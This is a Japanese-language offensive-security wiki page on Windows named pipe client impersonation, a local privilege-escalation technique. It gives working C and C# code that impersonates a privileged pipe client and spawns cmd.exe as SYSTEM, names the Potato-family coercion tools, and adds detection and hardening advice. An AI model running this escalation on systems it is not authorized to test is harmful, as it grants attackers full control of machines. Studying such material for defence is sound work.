# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation は、名前付きパイプのサーバースレッドが接続してきたクライアントのセキュリティコンテキストを引き受けることを可能にするローカル権限昇格の原始的手法です。実際には、SeImpersonatePrivilege を持ってコードを実行できる攻撃者は、特権を持つクライアント（例：SYSTEM サービス）を攻撃者制御下のパイプに接続させ、ImpersonateNamedPipeClient を呼び出し、得られたトークンを DuplicateTokenEx で primary トークンに複製し、クライアントとしてプロセス（多くは NT AUTHORITY\SYSTEM）を起動させることができます。

このページはコア技術に焦点を当てます。SYSTEM をあなたのパイプに強制的に接続させるエンドツーエンドのエクスプロイトチェーンについては、下記の Potato family ページを参照してください。

## TL;DR
- 名前付きパイプを作成: \\.\pipe\<random> を作成して接続を待つ。
- 特権を持つコンポーネント（spooler/DCOM/EFSRPC/etc.）をそれに接続させる。
- パイプから少なくとも1件のメッセージを読み取り、その後 ImpersonateNamedPipeClient を呼び出す。
- 現在のスレッドからインパーソネーション・トークンを開き、DuplicateTokenEx(TokenPrimary) で複製し、CreateProcessWithTokenW/CreateProcessAsUser を使って SYSTEM プロセスを取得する。

## Requirements and key APIs
- 呼び出し元プロセス/スレッドに通常必要な特権:
- SeImpersonatePrivilege：接続してきたクライアントを正常にインパーソネートし、CreateProcessWithTokenW を使用するために必要。
- または、SYSTEM をインパーソネートした後に CreateProcessAsUser を使うこともでき、これには SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になる場合がある（これらは SYSTEM をインパーソネートしている間は満たされる）。
- 使用する主な API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (インパーソネーションの前に少なくとも1件のメッセージを読む必要がある)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: ローカルで有用な操作を行うには、クライアントが SecurityImpersonation を許可している必要がある（多くのローカル RPC/名前付きパイプクライアントのデフォルト）。クライアントはパイプを開くときに SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION を指定してこれを下げることができる。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
注意:
- ImpersonateNamedPipeClient が ERROR_CANNOT_IMPERSONATE (1368) を返す場合は、まずパイプを読み取り、クライアントが impersonation を Identification level に制限していないことを確認してください。
- プロセス作成に適したプライマリトークンを作成するには、DuplicateTokenEx を SecurityImpersonation と TokenPrimary と共に使用することを推奨します。

## .NET の簡単な例
.NET では、NamedPipeServerStream は RunAsClient を介して impersonate できます。一旦 impersonate したら、スレッドトークンを複製してプロセスを作成します。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM をパイプに誘導する一般的なトリガ／強制方法
これらの手法は特権サービスをあなたの named pipe に接続させ、インパーソネートできるようにします:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

詳しい使い方と互換性の情報は以下を参照:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

もしサービストリガからパイプを作成してインパーソネートし、SYSTEM を生成するまでの完全な例が必要であれば、次を参照してください:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## トラブルシューティングと注意点
- ImpersonateNamedPipeClient を呼ぶ前にパイプから少なくとも1件のメッセージを読み取る必要があります。さもないと ERROR_CANNOT_IMPERSONATE (1368) が発生します。
- クライアントが SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION で接続すると、サーバは完全にはインパーソネートできません。GetTokenInformation(TokenImpersonationLevel) でトークンのインパーソネーションレベルを確認してください。
- CreateProcessWithTokenW は呼び出し元に SeImpersonatePrivilege を必要とします。これが ERROR_PRIVILEGE_NOT_HELD (1314) で失敗する場合は、あらかじめ SYSTEM にインパーソネートした後で CreateProcessAsUser を使用してください。
- パイプをハードニングする場合は、ターゲットサービスが接続できるようにパイプのセキュリティ記述子が許可されていることを確認してください。デフォルトでは \\.\pipe 以下のパイプはサーバの DACL に従ってアクセス可能です。

## 検知とハードニング
- named pipe の作成と接続を監視してください。Sysmon Event IDs 17 (Pipe Created) と 18 (Pipe Connected) は正当なパイプ名のベースライン化や、トークン操作イベントの前に現れる異常でランダムに見えるパイプを検出するのに有用です。
- 次のようなシーケンスを探してください: プロセスがパイプを作成 → SYSTEM サービスが接続 → 作成したプロセスが SYSTEM として子プロセスを生成。
- 不要なサービスアカウントから SeImpersonatePrivilege を削除し、高権限での不要なサービスログオンを避けることで露出を低減します。
- 防御的な開発: 信頼できない named pipe に接続する場合、必要でない限りサーバがクライアントを完全にインパーソネートできないように SECURITY_SQOS_PRESENT と SECURITY_IDENTIFICATION を指定してください。

## 参考文献
- Windows: ImpersonateNamedPipeClient ドキュメント（インパーソネーション要件と挙動）。 https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes の権限昇格（ウォークスルーとコード例）。 https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
